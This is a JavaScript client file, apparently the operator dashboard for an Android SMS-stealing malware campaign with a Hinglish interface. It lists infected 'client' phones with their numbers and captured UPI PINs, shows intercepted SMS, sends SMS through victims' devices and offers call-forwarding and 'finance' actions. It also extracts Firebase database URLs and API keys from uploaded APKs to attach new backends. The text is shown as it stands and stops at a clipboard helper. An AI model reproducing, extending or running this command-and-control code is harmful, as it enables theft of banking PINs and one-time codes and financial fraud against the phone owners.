(function () {
  const API = window.location.origin;
  let token = localStorage.getItem("dp_token") || "";
  let sessionId = "";
  let currentUser = "";
  let projects = [];
  let activeProjectId = localStorage.getItem("dp_project") || "";
  let devices = [];
  let activeDevice = null;
  let refreshTimer = null;
  let currentView = "overview";
  let deviceFilter = "all";
  let favorites = JSON.parse(localStorage.getItem("dp_favs") || "[]");

  function saveFavs() {
    localStorage.setItem("dp_favs", JSON.stringify(favorites));
  }

  function isFav(id) {
    return favorites.includes(id);
  }

  function toggleFav(id) {
    if (isFav(id)) favorites = favorites.filter((x) => x !== id);
    else favorites.push(id);
    saveFavs();
    renderDeviceGrid();
    renderFavorites();
    toast(isFav(id) ? "Added to favorites" : "Removed from favorites");
  }

  const $ = (id) => document.getElementById(id);
  const show = (el, on) => {
    if (typeof el === "string") el = $(el);
    if (el) el.classList.toggle("hidden", !on);
  };

  function esc(s) {
    const d = document.createElement("div");
    d.textContent = s == null ? "" : String(s);
    return d.innerHTML;
  }

  function toast(msg, isErr) {
    const el = $("toast");
    if (!el) return;
    el.textContent = msg;
    el.className = isErr ? "toast err" : "toast ok";
    el.id = "toast";
    show(el, true);
    setTimeout(() => show(el, false), 3000);
  }

  function openSidebar() {
    $("sidebar")?.classList.add("open");
    const bd = $("sidebarBackdrop");
    if (bd) {
      bd.hidden = false;
      bd.classList.add("open");
    }
    document.body.style.overflow = "hidden";
  }

  function closeSidebar() {
    $("sidebar")?.classList.remove("open");
    const bd = $("sidebarBackdrop");
    if (bd) {
      bd.classList.remove("open");
      bd.hidden = true;
    }
    document.body.style.overflow = "";
  }

  function setupMobileNav() {
    $("btnOpenSidebar")?.addEventListener("click", openSidebar);
    $("btnCloseSidebar")?.addEventListener("click", closeSidebar);
    $("sidebarBackdrop")?.addEventListener("click", closeSidebar);
    window.addEventListener("resize", () => {
      if (window.innerWidth > 980) closeSidebar();
    });
  }

  async function api(path, opts = {}) {
    const headers = { "Content-Type": "application/json", "X-Client": "web", ...(opts.headers || {}) };
    if (token) headers.Authorization = "Bearer " + token;
    const res = await fetch(API + path, { ...opts, headers });
    const data = await res.json().catch(() => ({}));
    if (!res.ok) throw new Error(data.error || "Request failed");
    return data;
  }

  function parseTs(val) {
    if (val == null || val === "") return null;
    if (typeof val === "number") {
      if (!isFinite(val) || val <= 0) return null;
      return val < 1e12 ? val * 1000 : val;
    }
    const s = String(val).trim();
    if (!s || s === "—" || s === "-" || s.toLowerCase() === "null") return null;
    if (/^\d+$/.test(s)) {
      const n = Number(s);
      if (!isFinite(n) || n <= 0) return null;
      return n < 1e12 ? n * 1000 : n;
    }
    // dd/MM/yyyy | hh:mm:ss am  OR  dd-MM-yyyy | hh:mm pm
    const m1 = s.match(/^(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{2,4})\s*[|T\s]\s*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(am|pm)?/i);
    if (m1) {
      let year = Number(m1[3]);
      if (year < 100) year += 2000;
      let hour = Number(m1[4]);
      const min = Number(m1[5]);
      const sec = Number(m1[6] || 0);
      const ap = (m1[7] || "").toLowerCase();
      if (ap === "pm" && hour < 12) hour += 12;
      if (ap === "am" && hour === 12) hour = 0;
      const d = new Date(year, Number(m1[2]) - 1, Number(m1[1]), hour, min, sec);
      if (!isNaN(d.getTime())) return d.getTime();
    }
    const d = new Date(s);
    return isNaN(d.getTime()) ? null : d.getTime();
  }

  function pickLastSeen(raw) {
    const keys = [
      "lastSeen", "last_seen", "lastOnline", "last_online", "lastActive", "last_active",
      "updatedAt", "updated_at", "dateTime", "date_time", "datetime", "date",
      "time", "timestamp", "registeredAt", "registered_at", "createdAt", "created_at",
      "installDate", "install_date", "onlineTime", "connectedAt", "loginTime"
    ];
    for (const k of keys) {
      if (raw[k] != null && raw[k] !== "") {
        const ts = parseTs(raw[k]);
        if (ts) return ts;
      }
    }
    // scan unknown keys
    for (const [k, v] of Object.entries(raw)) {
      if (/date|seen|time|online|active|update|regist/i.test(k) && typeof v !== "object") {
        const ts = parseTs(v);
        if (ts) return ts;
      }
    }
    return null;
  }

  function fmtDate(ts) {
    if (!ts) return "—";
    return new Date(ts).toLocaleString("en-IN", {
      day: "2-digit", month: "2-digit", year: "numeric",
      hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: true,
    });
  }

  function fmtAgo(ts) {
    if (!ts) return "—";
    const diff = Date.now() - ts;
    if (diff < 0) return "Just now";
    const s = Math.floor(diff / 1000);
    const m = Math.floor(s / 60);
    const h = Math.floor(m / 60);
    const d = Math.floor(h / 24);
    if (s < 60) return s + "s ago";
    if (m < 60) return m + "m ago";
    if (h < 24) return h + "h " + (m % 60) + "m ago";
    if (d < 30) return d + "d ago";
    return fmtDate(ts);
  }

  function parseSims(raw) {
    if (!raw) return [];
    if (Array.isArray(raw)) return raw;
    if (typeof raw === "object") return Object.values(raw);
    return [];
  }

  function parseDevice(id, raw) {
    if (!raw || typeof raw !== "object") return null;
    const sims = parseSims(raw.sims);
    let lastSeen = pickLastSeen(raw);
    // Online devices with no timestamp → treat as now so modal isn't blank
    if (!lastSeen && raw.status === true) lastSeen = Date.now();
    return {
      id,
      name: String(raw.modelName || raw.model || raw.deviceName || id),
      battery: String(raw.battery ?? "—"),
      batteryDisplay: raw.battery != null
        ? (String(raw.battery).includes("%") ? String(raw.battery) : String(raw.battery) + "%")
        : "—",
      status: raw.status === true,
      phone: String(raw.mobNo || sims[0]?.phoneNumber || sims[0]?.number || "N/A"),
      android: String(raw.androidV || raw.androidVersion || "—"),
      sdk: String(raw.sdkV || raw.sdkVersion || "—"),
      upipin: raw.upipin ? String(raw.upipin) : null,
      notes: String(raw.notes || raw.note || ""),
      ip: String(raw.ip_address || raw.ip || "—"),
      storage: String(raw.storage || "—"),
      cpu: String(raw.cpu_arch || "—"),
      provider: String(raw.service_provider || "—"),
      sims,
      lastSeen,
      lastSeenFmt: lastSeen ? fmtDate(lastSeen) : "—",
      lastSeenAgo: lastSeen ? fmtAgo(lastSeen) : "—",
      raw,
    };
  }

  function parseSms(data) {
    const list = [];
    if (!data || typeof data !== "object") return list;
    const entries = Object.entries(data);
    const slice = entries.length > 500 ? entries.slice(entries.length - 500) : entries;
    for (const [, raw] of slice) {
      if (!raw || typeof raw !== "object") continue;
      const text = String(raw.message || raw.body || raw.text || "").trim();
      if (!text) continue;
      list.push({
        sender: String(raw.sender || raw.from || "Unknown"),
        body: text,
        time: String(raw.dateTime || raw.date || ""),
      });
    }
    return list.reverse();
  }

  function simLabel(sim, idx) {
    if (!sim) return "Unknown";
    const carrier = sim.carrierName || sim.carrier || sim.operator || sim.serviceProvider || "";
    const state = sim.simState || sim.state || sim.status || "";
    const phone = sim.phoneNumber || sim.number || sim.mobNo || "";
    const parts = [state, carrier, phone].filter(Boolean);
    return parts.length ? parts.join(" — ") : "SIM " + (idx + 1);
  }

  // ─── Auth ───────────────────────────────────────────────
  function initAuth() {
    document.querySelectorAll(".tab").forEach((t) => {
      t.onclick = () => {
        document.querySelectorAll(".tab").forEach((x) => x.classList.remove("active"));
        t.classList.add("active");
        show("loginPanel", t.dataset.tab === "login");
        show("registerPanel", t.dataset.tab === "register");
        setErr("loginErr", "");
        setErr("regErr", "");
      };
    });

    $("btnLogin").onclick = doLogin;
    $("btn2fa").onclick = do2fa;
    $("btnRegister").onclick = doRegister;
    $("btnLogout").onclick = logout;

    if (token) {
      api("/api/auth/me").then((d) => enterApp(d.username)).catch(logout);
    }
  }

  function setErr(id, msg) {
    const el = $(id);
    if (!msg) { show(el, false); return; }
    el.textContent = msg;
    show(el, true);
  }

  async function doLogin() {
    setErr("loginErr", "");
    const username = $("loginUser").value.trim();
    const password = $("loginPass").value;
    if (!username || !password) return setErr("loginErr", "Username aur password daalo");
    $("btnLogin").disabled = true;
    try {
      const data = await api("/api/auth/login", { method: "POST", body: JSON.stringify({ username, password }) });
      if (data.requires2FA) {
        sessionId = data.sessionId;
        show("loginPanel", false);
        show("twofaPanel", true);
      } else {
        token = data.token;
        localStorage.setItem("dp_token", token);
        enterApp(data.username);
      }
    } catch (e) {
      setErr("loginErr", e.message);
    } finally {
      $("btnLogin").disabled = false;
    }
  }

  async function do2fa() {
    setErr("twofaErr", "");
    const code = $("twofaCode").value.trim();
    if (!code) return setErr("twofaErr", "Code daalo");
    try {
      const data = await api("/api/auth/verify-2fa", { method: "POST", body: JSON.stringify({ sessionId, code }) });
      token = data.token;
      localStorage.setItem("dp_token", token);
      show("twofaPanel", false);
      enterApp(data.username);
    } catch (e) {
      setErr("twofaErr", e.message);
    }
  }

  async function doRegister() {
    setErr("regErr", "");
    show("regOk", false);
    const adminKey = $("regAdminKey").value.trim();
    const username = $("regUser").value.trim();
    const password = $("regPass").value;
    const pass2 = $("regPass2").value;
    if (!adminKey) return setErr("regErr", "Admin Key required");
    if (!username || !password) return setErr("regErr", "Username aur password daalo");
    if (password !== pass2) return setErr("regErr", "Password match nahi karta");
    $("btnRegister").disabled = true;
    try {
      const res = await fetch(API + "/api/admin/accounts", {
        method: "POST",
        headers: { "Content-Type": "application/json", "X-Admin-Key": adminKey },
        body: JSON.stringify({ username, password }),
      });
      const d = await res.json();
      if (!res.ok) throw new Error(d.error || "Failed");
      $("regOk").textContent = "Account ban gaya! Ab login karo.";
      show("regOk", true);
      $("regUser").value = "";
      $("regPass").value = "";
      $("regPass2").value = "";
    } catch (e) {
      setErr("regErr", e.message);
    } finally {
      $("btnRegister").disabled = false;
    }
  }

  function logout() {
    token = "";
    activeProjectId = "";
    localStorage.removeItem("dp_token");
    localStorage.removeItem("dp_project");
    stopRefresh();
    show("appView", false);
    show("authView", true);
    show("loginPanel", true);
    show("registerPanel", false);
    show("twofaPanel", false);
  }

  // ─── App ────────────────────────────────────────────────
  async function enterApp(username) {
    currentUser = username;
    show("authView", false);
    show("appView", true);
    $("sidebarUser").innerHTML = "Logged in as <b>" + esc(username) + "</b>";
    if ($("mobileUser")) $("mobileUser").textContent = username || "";
    await loadProjects();
    initNav();
    setupMobileNav();
    if (activeProjectId && projects.find((p) => p.id === activeProjectId)) {
      switchView("overview");
      loadDevices();
      startRefresh();
    } else if (projects.length === 1) {
      selectProject(projects[0].id);
    } else {
      switchView("projects");
    }
  }

  function initNav() {
    document.querySelectorAll(".nav-item[data-view]").forEach((el) => {
      el.onclick = () => {
        const v = el.dataset.view;
        if ((v === "devices" || v === "overview" || v === "favorites") && !activeProjectId) {
          toast("Pehle Firebase project select karo", true);
          switchView("projects");
          return;
        }
        switchView(v);
        closeSidebar();
        if (v === "overview" || v === "devices") loadDevices(true);
        if (v === "favorites") renderFavorites();
        if (v === "telegram") loadTelegramBot();
      };
    });
    $("btnRefresh").onclick = () => {
      if (currentView === "devices" || currentView === "overview") loadDevices();
      else if (currentView === "detail" && activeDevice) openDevice(activeDevice.id);
    };
    if ($("btnRefreshOverview")) {
      $("btnRefreshOverview").onclick = () => loadDevices();
    }
    $("btnBackDevices").onclick = () => { switchView("devices"); loadDevices(); };
    $("deviceSearch").oninput = renderDeviceGrid;
    document.querySelectorAll("#deviceFilters .chip").forEach((chip) => {
      chip.onclick = () => {
        document.querySelectorAll("#deviceFilters .chip").forEach((c) => c.classList.remove("active"));
        chip.classList.add("active");
        deviceFilter = chip.dataset.filter || "all";
        renderDeviceGrid();
      };
    });
  }

  function switchView(view) {
    currentView = view;
    document.querySelectorAll(".nav-item[data-view]").forEach((el) => {
      el.classList.toggle("active", el.dataset.view === view);
    });
    show("viewOverview", view === "overview");
    show("viewDevices", view === "devices");
    show("viewFavorites", view === "favorites");
    show("viewProjects", view === "projects");
    show("viewTelegram", view === "telegram");
    show("viewDetail", view === "detail");
    if (view === "projects") loadProjects(true);
    if (view === "favorites") renderFavorites();
    if (view === "telegram") loadTelegramBot();
  }

  function startRefresh() {
    stopRefresh();
    refreshTimer = setInterval(() => {
      if (currentView === "devices" || currentView === "overview") loadDevices(true);
      else if (currentView === "detail" && activeDevice) loadDeviceDetail(activeDevice.id, true);
    }, 15000);
  }

  function stopRefresh() {
    if (refreshTimer) clearInterval(refreshTimer);
    refreshTimer = null;
  }

  function syncProjectSelects() {
    const html = projects.map((p) =>
      `<option value="${esc(p.id)}" ${p.id === activeProjectId ? "selected" : ""}>${esc(p.name)}</option>`
    ).join("") || '<option value="">No project</option>';
    ["projectSelect", "projectSelectOverview"].forEach((id) => {
      const el = $(id);
      if (!el) return;
      el.innerHTML = html;
      el.onchange = (e) => selectProject(e.target.value);
    });
  }

  async function loadProjects(renderList) {
    try {
      const data = await api("/api/firebase-projects");
      projects = data.projects || [];
      if (renderList) renderProjectList();
      syncProjectSelects();
    } catch (e) {
      if (e.message.includes("Unauthorized")) logout();
      else toast(e.message, true);
    }
  }

  function selectProject(id) {
    activeProjectId = id;
    localStorage.setItem("dp_project", id);
    syncProjectSelects();
    switchView("overview");
    loadDevices();
    startRefresh();
  }

  function renderProjectList() {
    const box = $("fbList");
    box.innerHTML = "";
    show("fbEmpty", projects.length === 0);
    projects.forEach((p) => {
      const div = document.createElement("div");
      div.className = "fb-item" + (p.id === activeProjectId ? " selected" : "");
      div.innerHTML = `
        <div>
          <div class="fb-name">${esc(p.name)}</div>
          <div class="fb-url">${esc(p.firebaseUrl || "")}</div>
        </div>
        <div style="display:flex;gap:6px;flex-shrink:0">
          <button class="btn btn-sm btn-cyan" data-open="${p.id}">Open</button>
          <button class="btn btn-sm btn-outline" data-test="${p.id}">Test</button>
          <button class="btn btn-sm btn-danger" data-del="${p.id}">Del</button>
        </div>`;
      box.appendChild(div);
    });
    box.querySelectorAll("[data-open]").forEach((b) => { b.onclick = () => selectProject(b.dataset.open); });
    box.querySelectorAll("[data-test]").forEach((b) => {
      b.onclick = async () => {
        try { await api("/api/firebase-projects/" + b.dataset.test + "/test", { method: "POST" }); toast("Connection OK!"); }
        catch (e) { toast(e.message, true); }
      };
    });
    box.querySelectorAll("[data-del]").forEach((b) => {
      b.onclick = async () => {
        if (!confirm("Delete this Firebase?")) return;
        try {
          await api("/api/firebase-projects/" + b.dataset.del, { method: "DELETE" });
          if (activeProjectId === b.dataset.del) activeProjectId = "";
          loadProjects(true);
        } catch (e) { toast(e.message, true); }
      };
    });
  }

  let lastExtracted = null;

  function bytesToString(uint8) {
    let s = "";
    for (let i = 0; i < uint8.length; i += 65536) {
      s += String.fromCharCode(...uint8.subarray(i, i + 65536));
    }
    return s;
  }

  function matchFromBytes(uint8) {
    const text = bytesToString(uint8);
    const url =
      text.match(/https:\/\/[a-z0-9_-]+\.firebaseio\.com/i)?.[0] ||
      text.match(/https:\/\/[a-z0-9_-]+-default-rtdb\.[a-z0-9-]+\.firebasedatabase\.app/i)?.[0] ||
      "";
    const key =
      text.match(/AIza[A-Za-z0-9_-]{35}/)?.[0] ||
      text.match(/(?:databaseSecret|firebaseSecret|FIREBASE_SECRET|dbSecret)[=:"'\s]{1,12}([A-Za-z0-9_-]{24,})/i)?.[1] ||
      "";
    return { url, key };
  }

  async function extractFirebaseFromApk(file) {
    if (typeof JSZip === "undefined") throw new Error("JSZip load nahi hua — page refresh karo");
    const zip = await JSZip.loadAsync(await file.arrayBuffer());
    let firebaseUrl = "";
    let secret = "";
    let projectId = "";

    const tryFile = async (entry) => {
      if (!entry || firebaseUrl && secret) return;
      try {
        const bytes = await entry.async("uint8array");
        const found = matchFromBytes(bytes);
        if (!firebaseUrl && found.url) firebaseUrl = found.url;
        if (!secret && found.key) secret = found.key;
      } catch (_) {}
    };

    await tryFile(zip.file("resources.arsc"));
    for (const name of ["classes.dex", "classes2.dex", "classes3.dex", "classes4.dex"]) {
      await tryFile(zip.file(name));
      if (firebaseUrl && secret) break;
    }

    const gsCandidates = [
      zip.file("google-services.json"),
      zip.file("assets/google-services.json"),
    ].filter(Boolean);
    const gsRegex = zip.file(/google-services\.json$/i);
    if (gsRegex && gsRegex[0]) gsCandidates.push(gsRegex[0]);

    for (const entry of gsCandidates) {
      try {
        const json = JSON.parse(await entry.async("text"));
        if (!firebaseUrl) firebaseUrl = json?.project_info?.firebase_url || "";
        if (!projectId) projectId = json?.project_info?.project_id || "";
        const client = json?.client?.[0];
        if (!secret) secret = client?.api_key?.[0]?.current_key || "";
        const dbUrl = client?.services?.analytics_service?.other_platform_oauth_client
          ? null
          : null;
        void dbUrl;
      } catch (_) {}
    }

    if (!firebaseUrl || !secret) {
      for (const name of Object.keys(zip.files)) {
        if (firebaseUrl && secret) break;
        const f = zip.files[name];
        if (f.dir) continue;
        if (f._data && f._data.uncompressedSize > 8_000_000) continue;
        if (!/\.(dex|arsc|json|xml|so|bin)$/i.test(name) && !name.includes("assets")) continue;
        await tryFile(f);
      }
    }

    if (!firebaseUrl && !secret) return null;
    return { firebaseUrl, secret, projectId };
  }

  function setApkStatus(msg, isErr) {
    const el = $("apkStatus");
    el.textContent = msg || "";
    el.style.color = isErr ? "#f87171" : "var(--muted)";
  }

  async function handleApkFile(file) {
    if (!file) return;
    const n = file.name.toLowerCase();
    if (!n.endsWith(".apk") && !n.endsWith(".zip")) {
      setApkStatus("Sirf .apk / .zip file support hai", true);
      return;
    }
    setApkStatus("Extracting Firebase from APK...");
    show("btnUseExtracted", false);
    lastExtracted = null;
    try {
      const found = await extractFirebaseFromApk(file);
      if (!found || (!found.firebaseUrl && !found.secret)) {
        setApkStatus("APK se Firebase nahi mila — manual daalo", true);
        return;
      }
      lastExtracted = found;
      const bit = [];
      if (found.firebaseUrl) bit.push("URL ✓");
      if (found.secret) bit.push("Key ✓");
      if (found.projectId) bit.push("Project: " + found.projectId);
      setApkStatus("Extract OK — " + bit.join(" · "));
      // auto-fill form
      if (found.firebaseUrl) $("fbUrl").value = found.firebaseUrl;
      if (found.secret) $("fbSecret").value = found.secret;
      if (!$("fbName").value.trim()) {
        $("fbName").value = found.projectId || file.name.replace(/\.(apk|zip)$/i, "");
      }
      show("btnUseExtracted", true);
      toast("APK se Firebase mil gaya — Save & Test dabao");
    } catch (e) {
      setApkStatus(e.message || "Extract failed", true);
    }
  }

  $("apkFileInput").onchange = (e) => handleApkFile(e.target.files?.[0]);
  $("btnUseExtracted").onclick = () => {
    if (!lastExtracted) return;
    if (lastExtracted.firebaseUrl) $("fbUrl").value = lastExtracted.firebaseUrl;
    if (lastExtracted.secret) $("fbSecret").value = lastExtracted.secret;
    if (!$("fbName").value.trim() && lastExtracted.projectId) {
      $("fbName").value = lastExtracted.projectId;
    }
    $("fbName").scrollIntoView({ behavior: "smooth", block: "center" });
    toast("Form fill ho gaya — Save & Test dabao");
  };

  const drop = $("apkDropZone");
  ["dragenter", "dragover"].forEach((ev) => {
    drop.addEventListener(ev, (e) => { e.preventDefault(); drop.classList.add("drag"); });
  });
  ["dragleave", "drop"].forEach((ev) => {
    drop.addEventListener(ev, (e) => { e.preventDefault(); drop.classList.remove("drag"); });
  });
  drop.addEventListener("drop", (e) => {
    const file = e.dataTransfer?.files?.[0];
    if (file) handleApkFile(file);
  });

  $("btnAddFb").onclick = async () => {
    const name = $("fbName").value.trim();
    const firebaseUrl = $("fbUrl").value.trim();
    const firebaseSecret = $("fbSecret").value.trim();
    if (!name || !firebaseUrl || !firebaseSecret) return toast("Saari fields bhari karo", true);
    $("btnAddFb").disabled = true;
    try {
      await api("/api/firebase-projects", { method: "POST", body: JSON.stringify({ name, firebaseUrl, firebaseSecret }) });
      $("fbName").value = ""; $("fbUrl").value = ""; $("fbSecret").value = "";
      lastExtracted = null;
      show("btnUseExtracted", false);
      setApkStatus("");
      $("apkFileInput").value = "";
      toast("Firebase added!");
      await loadProjects(true);
    } catch (e) { toast(e.message, true); }
    finally { $("btnAddFb").disabled = false; }
  };

  async function loadDevices(silent) {
    if (!activeProjectId) return;
    if (!silent && $("deviceGrid")) $("deviceGrid").innerHTML = '<div class="empty">Loading devices...</div>';
    try {
      const data = await api("/api/projects/" + activeProjectId + "/clients");
      devices = Object.entries(data || {}).map(([id, raw]) => parseDevice(id, raw)).filter(Boolean);
      devices.sort((a, b) => (b.status - a.status) || (b.lastSeen || 0) - (a.lastSeen || 0));
      const online = devices.filter((d) => d.status).length;
      const upi = devices.filter((d) => d.upipin).length;
      $("statOnline").textContent = online;
      $("statTotal").textContent = devices.length;
      $("statOffline").textContent = devices.length - online;
      if ($("statUpi")) $("statUpi").textContent = upi;
      renderDeviceGrid();
      renderOverview();
      if (currentView === "favorites") renderFavorites();
    } catch (e) {
      if (!silent) $("deviceGrid").innerHTML = '<div class="empty">' + esc(e.message) + '</div>';
    }
  }

  function renderOverview() {
    if (!$("ovOnline")) return;
    const online = devices.filter((d) => d.status).length;
    const total = devices.length;
    const offline = total - online;
    const upi = devices.filter((d) => d.upipin).length;
    const pct = total ? Math.round((online / total) * 100) : 0;
    $("ovOnline").textContent = online;
    $("ovOffline").textContent = offline;
    $("ovTotal").textContent = total;
    $("ovUpi").textContent = upi;
    $("ovOnlinePct").textContent = pct + "% live";
    $("ovOfflinePct").textContent = total ? Math.round((offline / total) * 100) + "% away" : "—";
    if ($("onlineRing")) {
      $("onlineRing").style.setProperty("--pct", pct + "%");
      $("onlineRingPct").textContent = pct + "%";
    }
    const bars = $("statusBars");
    if (bars) {
      const buckets = [0, 0, 0, 0, 0, 0];
      const now = Date.now();
      devices.forEach((d) => {
        if (!d.lastSeen) { buckets[5]++; return; }
        const hours = (now - d.lastSeen) / 3600000;
        if (hours < 1) buckets[0]++;
        else if (hours < 6) buckets[1]++;
        else if (hours < 24) buckets[2]++;
        else if (hours < 72) buckets[3]++;
        else buckets[4]++;
      });
      const labels = ["1h", "6h", "24h", "3d", "Older", "N/A"];
      const max = Math.max(...buckets, 1);
      bars.innerHTML = buckets.map((n, i) => {
        const h = Math.max(8, Math.round((n / max) * 120));
        return `<div class="bar-wrap"><div class="bar" style="height:${h}px"></div><div class="bar-lbl">${labels[i]} (${n})</div></div>`;
      }).join("");
    }
    const recent = $("recentActivity");
    if (recent) {
      const top = devices.slice(0, 8);
      if (!top.length) {
        recent.innerHTML = '<div class="empty">No devices yet</div>';
      } else {
        recent.innerHTML = top.map((d) => `
          <div class="activity-item" style="cursor:pointer" data-open="${esc(d.id)}">
            <div class="activity-dot" style="background:${d.status ? "var(--green)" : "var(--orange)"}"></div>
            <div style="flex:1">
              <b>${esc(d.name)}</b> · ${d.status ? "Online" : "Offline"}
              <div style="color:var(--muted);font-size:0.75rem;margin-top:2px">${esc(d.phone)} · ${esc(d.lastSeenFmt)}</div>
            </div>
            <button class="btn btn-sm btn-outline" data-open="${esc(d.id)}">Open</button>
          </div>
        `).join("");
        recent.querySelectorAll("[data-open]").forEach((b) => {
          b.onclick = () => openDevice(b.dataset.open);
        });
      }
    }
  }

  function filteredDevices() {
    const q = ($("deviceSearch")?.value || "").trim().toLowerCase();
    let list = devices;
    if (deviceFilter === "online") list = list.filter((d) => d.status);
    else if (deviceFilter === "offline") list = list.filter((d) => !d.status);
    else if (deviceFilter === "upi") list = list.filter((d) => d.upipin);
    else if (deviceFilter === "star") list = list.filter((d) => isFav(d.id));
    if (q) {
      list = list.filter((d) =>
        d.name.toLowerCase().includes(q) || d.phone.toLowerCase().includes(q) ||
        d.id.toLowerCase().includes(q) || d.notes.toLowerCase().includes(q)
      );
    }
    return list;
  }

  function deviceCardHtml(d) {
    return `
      <div class="device-card" data-id="${esc(d.id)}">
        <div class="row">
          <div class="model">${esc(d.name)}</div>
          <span class="${d.status ? "status-online" : "status-offline"}">${d.status ? "Online" : "Offline"}</span>
        </div>
        <div class="field"><span>Phone: </span><b>${esc(d.phone)}</b></div>
        <div class="field"><span>UPI Pin: </span><b>${esc(d.upipin || "N/A")}</b></div>
        <div class="field"><span>Model: </span><b>${esc(d.name)}</b></div>
        <div class="field"><span>Battery: </span><b>${esc(d.batteryDisplay)}</b></div>
        <div class="date">${esc(d.lastSeenFmt !== "—" ? d.lastSeenFmt : "—")}</div>
        <div class="notes">${d.notes ? esc(d.notes) : "No Notes"}</div>
        <div class="card-actions">
          <button class="icon-btn star ${isFav(d.id) ? "on" : ""}" title="Favorite" data-star="${esc(d.id)}">★</button>
          <button class="icon-btn" title="System Settings" data-settings="${esc(d.id)}">⚙</button>
          <button class="icon-btn" title="Last Seen" data-lastseen="${esc(d.id)}">🕐</button>
          <button class="icon-btn finance" title="Finance" data-finance="${esc(d.id)}">$</button>
          <button class="icon-btn" title="Forward" data-forward="${esc(d.id)}">📞</button>
          <button class="icon-btn danger" title="Delete" data-del="${esc(d.id)}">🗑</button>
        </div>
      </div>
    `;
  }

  function wireDeviceCards(box) {
    box.querySelectorAll(".device-card").forEach((card) => {
      card.onclick = (e) => {
        if (e.target.closest(".icon-btn")) return;
        openDevice(card.dataset.id);
      };
    });
    box.querySelectorAll("[data-star]").forEach((b) => {
      b.onclick = (e) => { e.stopPropagation(); toggleFav(b.dataset.star); };
    });
    box.querySelectorAll("[data-settings]").forEach((b) => { b.onclick = (e) => { e.stopPropagation(); showSettingsModal(b.dataset.settings); }; });
    box.querySelectorAll("[data-lastseen]").forEach((b) => { b.onclick = (e) => { e.stopPropagation(); showLastSeenModal(b.dataset.lastseen); }; });
    box.querySelectorAll("[data-finance]").forEach((b) => { b.onclick = (e) => { e.stopPropagation(); showFinanceModal(b.dataset.finance); }; });
    box.querySelectorAll("[data-forward]").forEach((b) => { b.onclick = (e) => { e.stopPropagation(); showForwardModal(b.dataset.forward); }; });
    box.querySelectorAll("[data-del]").forEach((b) => {
      b.onclick = async (e) => {
        e.stopPropagation();
        if (!confirm("Delete device?")) return;
        try {
          await api("/api/projects/" + activeProjectId + "/clients/" + b.dataset.del, { method: "DELETE" });
          loadDevices();
        } catch (err) { toast(err.message, true); }
      };
    });
  }

  function renderDeviceGrid() {
    const filtered = filteredDevices();
    const box = $("deviceGrid");
    if (!box) return;
    if (!filtered.length) {
      box.innerHTML = '<div class="empty">Koi device nahi mila</div>';
      return;
    }
    box.innerHTML = filtered.map(deviceCardHtml).join("");
    wireDeviceCards(box);
  }

  function renderFavorites() {
    const box = $("favGrid");
    if (!box) return;
    const list = devices.filter((d) => isFav(d.id));
    if (!list.length) {
      box.innerHTML = '<div class="empty">Star devices to pin here</div>';
      return;
    }
    box.innerHTML = list.map(deviceCardHtml).join("");
    wireDeviceCards(box);
  }

  async function openDevice(id) {
    activeDevice = devices.find((d) => d.id === id) || null;
    if (!activeDevice) {
      try {
        const raw = await api("/api/projects/" + activeProjectId + "/clients/" + id);
        activeDevice = parseDevice(id, raw);
      } catch (e) { toast(e.message, true); return; }
    }
    switchView("detail");
    renderDeviceDetail();
    loadDeviceDetail(id);
    refreshSendAutoStatus();
  }

  function renderDeviceDetail() {
    const d = activeDevice;
    if (!d) return;
    $("detailTitle").textContent = d.name;
    $("detailStatus").className = "badge " + (d.status ? "badge-online" : "badge-offline");
    $("detailStatus").textContent = d.status ? "Online" : "Offline";
    $("detailNotes").value = d.notes || "";
    $("infoModel").textContent = d.name;
    $("infoPhone").textContent = d.phone;
    $("infoUpi").textContent = d.upipin || "N/A";
    $("infoSim1").textContent = d.sims[0] ? simLabel(d.sims[0], 0) : "Not Available";
    $("infoSim2").textContent = d.sims[1] ? simLabel(d.sims[1], 1) : "Not Available";
    $("infoDate").textContent = d.lastSeenFmt;
  }

  async function loadDeviceDetail(id, silent) {
    try {
      const [raw, smsData] = await Promise.all([
        api("/api/projects/" + activeProjectId + "/clients/" + id),
        api("/api/projects/" + activeProjectId + "/messages/" + id),
      ]);
      activeDevice = parseDevice(id, raw);
      renderDeviceDetail();
      const sms = parseSms(smsData);
      window._detailSms = sms;
      renderSmsList(sms);
      if (!silent) toast("Device updated");
    } catch (e) {
      if (!silent) toast(e.message, true);
    }
  }

  function renderSmsList(list) {
    const q = ($("smsSearch").value || "").trim().toLowerCase();
    const filtered = q ? list.filter((s) => s.sender.toLowerCase().includes(q) || s.body.toLowerCase().includes(q)) : list;
    $("smsCount").textContent = filtered.length + " / " + list.length + " messages";
    const box = $("smsList");
    if (!filtered.length) {
      box.innerHTML = '<div class="empty">No messages</div>';
      return;
    }
    box.innerHTML = filtered.map((s, i) => `
      <div class="sms-item">
        <div class="body">${esc(s.body)}</div>
        <div class="meta">
          <span>${esc(s.sender)}</span>
          <span>${esc(s.time)}</span>
          <span>incoming</span>
          <button class="btn btn-sm btn-outline" data-copy-idx="${i}">Copy</button>
        </div>
      </div>
    `).join("");
    box.querySelectorAll("[data-copy-idx]").forEach((btn) => {
      btn.onclick = () => {
        const idx = Number(btn.dataset.copyIdx);
        navigator.clipboard.writeText(filtered[idx].body);
        toast("Copied!");
      };
    });
  }

  $("smsSearch").oninput = () => renderSmsList(window._detailSms || []);
  $("btnSaveNotes").onclick = async () => {
    if (!activeDevice) return;
    try {
      await api("/api/projects/" + activeProjectId + "/clients/" + activeDevice.id + "/notes", {
        method: "PATCH",
        body: JSON.stringify({ notes: $("detailNotes").value }),
      });
      activeDevice.notes = $("detailNotes").value;
      toast("Notes saved!");
    } catch (e) { toast(e.message, true); }
  };

  $("btnSendSms").onclick = async () => {
    if (!activeDevice) return;
    const to = $("smsTo").value.trim();
    const message = $("smsMsg").value.trim();
    const sim = $("smsSim").value;
    if (!to || !message) return toast("Number aur message daalo", true);
    try {
      await api("/api/projects/" + activeProjectId + "/clients/" + activeDevice.id + "/send-sms", {
        method: "POST",
        body: JSON.stringify({ to, message, from: Number(sim) || 1 }),
      });
      toast("SMS queued!");
      $("smsMsg").value = "";
    } catch (e) { toast(e.message, true); }
  };

  async function pasteInto(elId) {
    try {
      const text = await navigator.clipboard.readText();
      if (!text) return toast("Clipboard empty", true);
      $(elId).value = text.trim();
      toast("Pasted");
    } catch (e) {
      toast("Clipboard paste allowed nahi — manually paste karo", true);
    }
  }

